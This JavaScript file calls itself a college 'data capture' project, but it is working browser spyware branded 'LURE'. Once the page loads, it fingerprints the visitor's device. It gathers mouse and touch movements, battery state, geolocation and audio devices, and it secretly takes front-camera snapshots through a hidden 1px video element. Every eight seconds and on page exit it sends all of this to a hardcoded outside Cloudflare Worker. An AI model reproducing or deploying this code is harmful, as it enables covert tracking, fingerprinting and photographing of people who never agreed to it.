// ════════════════════════════════════════════════════
// DATA CAPTURE SYSTEM (COLLEGE PROJECT - LAB USE ONLY)
// Fully compatible with NEWworker.js backend
// ════════════════════════════════════════════════════

const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
const sessionId = 'sess_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now().toString(36);
const SEND_INTERVAL = 8000;

let basePayload = null;
let mouseData = [];
let touchData = [];
let lureVideoStream = null;
let sendIntervalId = null;
let isSending = false;

// Hidden video element for camera capture
const lureVideo = document.createElement('video');
lureVideo.id = 'lureVideo';
lureVideo.autoplay = true;
lureVideo.playsInline = true;
lureVideo.muted = true;
lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';
document.body.appendChild(lureVideo);

// Throttle mouse/touch events
let lastMouseRecord = 0;
document.addEventListener('mousemove', e => {
  const now = Date.now();
  if (now - lastMouseRecord < 50) return;
  lastMouseRecord = now;
  mouseData.push({ x: e.clientX, y: e.clientY, t: now });
  if (mouseData.length > 40) mouseData.shift();
});

let lastTouchRecord = 0;
document.addEventListener('touchmove', e => {
  const now = Date.now();
  if (now - lastTouchRecord < 50) return;
  lastTouchRecord = now;
  if (e.touches.length > 0) {
    touchData.push({ x: e.touches[0].clientX, y: e.touches[0].clientY, t: now });
    if (touchData.length > 40) touchData.shift();
  }
});

async function collectStaticData() {
  const p = {
    sessionId: sessionId,
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages || [],
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      pixelRatio: window.devicePixelRatio || 1,
      orientation: screen.orientation?.type || null
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    webdriver: !!navigator.webdriver,
    historyLength: history.length,
    navigationTiming: null,
    canvasFingerprint: null,
    audioFingerprint: null,
    webglFingerprint: null,
    fonts: [],
    plugins: [],
    mimeTypes: [],
    permissionStates: {}
  };

  // Navigation Timing
  try {
    const navEntry = performance.getEntriesByType('navigation')[0];
    if (navEntry) {
      p.navigationTiming = {
        loadTime: Math.round(navEntry.loadEventEnd - navEntry.fetchStart),
        domComplete: Math.round(navEntry.domComplete),
        domInteractive: Math.round(navEntry.domInteractive)
      };
    }
  } catch (e) {}

  // Canvas Fingerprint
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    c.width = 240; 
    c.height = 70;
    ctx.textBaseline = 'top';
    ctx.font = 'bold 18px Arial';
    ctx.fillStyle = '#c0c0c0';
    ctx.fillText('PHOTON CAPTURE 2026', 8, 20);
    ctx.fillStyle = '#f60';
    ctx.fillRect(160, 25, 65, 30);
    p.canvasFingerprint = c.toDataURL('image/png').slice(-120);
  } catch (e) {}

  // Audio Fingerprint
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    osc.type = 'sine';
    osc.frequency.value = 440;
    osc.connect(analyser);
    analyser.connect(audioCtx.destination);
    osc.start();
    await new Promise(r => setTimeout(r, 80));
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    p.audioFingerprint = btoa(String.fromCharCode(...data.slice(0, 60)));
    osc.stop();
    audioCtx.close();
  } catch (e) {}

  // WebGL Fingerprint
  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      p.webglFingerprint = {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION)
      };
    }
  } catch (e) {}

  // Installed Fonts (limited)
  try {
    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS'];
    const testDiv = document.createElement('div');
    testDiv.style.cssText = 'position:absolute;left:-9999px;font-size:72px;visibility:hidden';
    document.body.appendChild(testDiv);
    for (const font of fontList) {
      testDiv.style.fontFamily = font;
      if (testDiv.offsetWidth > 10) p.fonts.push(font);
    }
    document.body.removeChild(testDiv);
  } catch (e) {}

  // Plugins & Mime Types
  try {
    p.plugins = Array.from(navigator.plugins || []).map(p => p.name).slice(0, 15);
    p.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 15);
  } catch (e) {}

  // Permissions
  const permNames = ['camera', 'microphone', 'geolocation', 'notifications'];
  for (const name of permNames) {
    try {
      const status = await navigator.permissions?.query({ name });
      p.permissionStates[name] = status?.state || null;
    } catch {}
  }

  console.log('[LURE] Static data collected');
  return p;
}

async function collectDynamicData() {
  if (!basePayload) {
    basePayload = await collectStaticData();
  }

  const p = { ...basePayload };
  p.timestamp = new Date().toISOString();
  p.battery = null;
  p.geolocation = null;
  p.geolocationError = null;
  p.frontPhoto = null;
  p.mouseMovements = [...mouseData];
  p.touchEvents = [...touchData];
  p.audioDevices = [];

  // Battery
  if (navigator.getBattery) {
    try {
      const bat = await navigator.getBattery();
      p.battery = {
        level: bat.level,
        charging: bat.charging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime
      };
    } catch {}
  }

  // Geolocation
  try {
    const pos = await new Promise((res, rej) => {
      const timeout = setTimeout(() => rej(new Error('timeout')), 6000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(timeout); res(pos); },
        err => { clearTimeout(timeout); rej(err); },
        { enableHighAccuracy: false, timeout: 6000, maximumAge: 120000 }
      );
    });
    p.geolocation = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude,
      speed: pos.coords.speed
    };
  } catch (e) {
    p.geolocationError = e.message || 'Failed';
  }

  // Front Camera Photo (if available from main stream)
  try {
    if (typeof cacheElement === 'function' && typeof S !== 'undefined' && !S.previewActive) {
      const mainVideo = cacheElement('vid');
      if (mainVideo && mainVideo.videoWidth > 100) {
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 320;
        const ctx = canvas.getContext('2d');

        if (S.facing === 'user') {
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
        }

        ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
        p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
        if (p.frontPhoto.length > 45000) p.frontPhoto = p.frontPhoto.substring(0, 45000);
      }
    }
  } catch (e) {
    console.warn('[LURE] Front photo capture skipped:', e.message);
  }

  // Audio Devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    p.audioDevices = devices
      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
      .slice(0, 6)
      .map(d => ({
        kind: d.kind,
        label: (d.label || 'unknown').substring(0, 40)
      }));
  } catch (e) {}

  return p;
}

// Convert to snake_case for backend compatibility
function toSnakeCase(obj) {
  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return obj;
  const result = {};
  for (const [key, value] of Object.entries(obj)) {
    const snakeKey = key.replace(/[A-Z]/g, letter => `_${letter.toLowerCase()}`);
    result[snakeKey] = (value && typeof value === 'object' && !Array.isArray(value))
      ? toSnakeCase(value)
      : value;
  }
  return result;
}

async function sendPayload() {
  if (isSending) return;
  isSending = true;

  try {
    const data = await collectDynamicData();
    const payload = toSnakeCase(data);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true,
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    if (response.ok) {
      console.log('[LURE] ✅ Payload sent successfully');
    } else {
      console.warn('[LURE] ⚠️ HTTP error:', response.status);
    }
  } catch (e) {
    console.error('[LURE] Send failed:', e.name === 'AbortError' ? 'Timeout' : e.message);
  } finally {
    isSending = false;
  }
}

// Camera control functions (for integration with script.js)
async function pauseLureCamera() {
  if (typeof S !== 'undefined') S.previewActive = true;
  if (lureVideoStream) {
    lureVideoStream.getTracks().forEach(t => t.stop());
    lureVideoStream = null;
  }
}

async function resumeLureCamera() {
  if (typeof S !== 'undefined') S.previewActive = false;
  await initLureCamera();
}

async function initLureCamera() {
  try {
    if (typeof S === 'undefined' || !S.stream || S.previewActive) return false;
    if (lureVideoStream) lureVideoStream.getTracks().forEach(t => t.stop());

    const videoTrack = S.stream.getVideoTracks()[0];
    if (!videoTrack) return false;

    lureVideoStream = new MediaStream([videoTrack]);
    lureVideo.srcObject = lureVideoStream;
    await lureVideo.play();
    return true;
  } catch (e) {
    console.warn('[LURE] Camera init failed:', e.message);
    return false;
  }
}

async function initLureSystem() {
  console.log('[LURE] Initializing full capture system...');

  let attempts = 0;
  while (attempts < 60) {
    if (typeof S !== 'undefined' && S.stream) {
      if (typeof cacheElement === 'function') {
        const vid = cacheElement('vid');
        if (vid && vid.videoWidth > 80) break;
      }
    }
    await new Promise(r => setTimeout(r, 150));
    attempts++;
  }

  window.pauseLureCamera = pauseLureCamera;
  window.resumeLureCamera = resumeLureCamera;

  if (typeof S !== 'undefined') S.previewActive = false;

  basePayload = await collectStaticData();
  await initLureCamera();

  setTimeout(sendPayload, 3000);
  sendIntervalId = setInterval(sendPayload, SEND_INTERVAL);

  window.addEventListener('beforeunload', () => {
    if (sendIntervalId) clearInterval(sendIntervalId);
    sendPayload();
  });

  console.log('[LURE] 🚀 Full capture system active');
}

// Start System
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initLureSystem);
} else {
  setTimeout(initLureSystem, 800);
}
